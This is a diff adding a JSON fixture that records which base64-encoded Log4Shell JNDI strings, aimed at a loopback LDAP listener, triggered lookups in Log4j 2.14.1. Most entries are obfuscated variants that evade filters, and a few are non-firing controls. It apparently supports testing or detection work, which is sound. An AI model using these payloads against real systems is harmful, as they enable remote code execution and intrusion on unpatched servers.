@@ -1,0 +1,130 @@
+{
+ "about": "What Log4j 2.14.1 (Temurin 17) did with each string logged from a request header: fired = it opened a connection to the listener named in the string, on its own loopback. Values are base64 of the header bytes.",
+ "cases": [
+  {
+   "label": "plain",
+   "value": "JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "upper-case JNDI",
+   "value": "JHtKTkRJOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "lower lookup",
+   "value": "JHske2xvd2VyOmp9bmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "upper lookup",
+   "value": "JHske3VwcGVyOmp9bmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "lower on every letter",
+   "value": "JHske2xvd2VyOmp9JHtsb3dlcjpufSR7bG93ZXI6ZH0ke2xvd2VyOml9OmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "empty-name default",
+   "value": "JHskezo6LWp9JHs6Oi1ufSR7OjotZH0kezo6LWl9OmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "env default",
+   "value": "JHske2VudjpOT1BFOi1qfW5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": true
+  },
+  {
+   "label": "sys default",
+   "value": "JHtqJHtzeXM6bm9wZTotbn1kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": true
+  },
+  {
+   "label": "unknown name default",
+   "value": "JHske3g6LWp9bmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "name with space default",
+   "value": "JHskeyB4IHk6LWp9bmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "name with colon default",
+   "value": "JHske2E6Yjotan1uZGk6bGRhcDovLzEyNy4wLjAuMToxMzg5L2F9",
+   "fired": true
+  },
+  {
+   "label": "300-char name default",
+   "value": "JHske2FhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYTotan1uZGk6bGRhcDovLzEyNy4wLjAuMToxMzg5L2F9",
+   "fired": true
+  },
+  {
+   "label": "high-byte name default",
+   "value": "JHske+mAOi1qfW5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": true
+  },
+  {
+   "label": "date lookup",
+   "value": "JHske2RhdGU6J2onfW5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": true
+  },
+  {
+   "label": "scheme hidden",
+   "value": "JHtqbmRpOiR7bG93ZXI6bH0ke2xvd2VyOmR9YXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "slashes hidden",
+   "value": "JHtqbmRpOmxkYXA6JHs6Oi0vfSR7OjotL30xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "colon after jndi hidden",
+   "value": "JHtqbmRpJHs6Oi06fWxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==",
+   "fired": true
+  },
+  {
+   "label": "inner without colon",
+   "value": "JHske2F9am5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": false
+  },
+  {
+   "label": "space before jndi",
+   "value": "JHsgam5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": false
+  },
+  {
+   "label": "space between dollar and brace",
+   "value": "JCB7am5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": false
+  },
+  {
+   "label": "doubled dollar",
+   "value": "JCR7am5kaTpsZGFwOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": false
+  },
+  {
+   "label": "no closing brace",
+   "value": "JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9h",
+   "fired": false
+  },
+  {
+   "label": "ldaps scheme",
+   "value": "JHtqbmRpOmxkYXBzOi8vMTI3LjAuMC4xOjEzODkvYX0=",
+   "fired": true
+  },
+  {
+   "label": "benign shell default",
+   "value": "JHtIT01FOi0vcm9vdH0=",
+   "fired": false
+  },
+  {
+   "label": "benign template",
+   "value": "SGVsbG8gJHt1c2VyLm5hbWV9LCB0b3RhbCAke2Ftb3VudH0=",
+   "fired": false
+  }
+ ]
+}
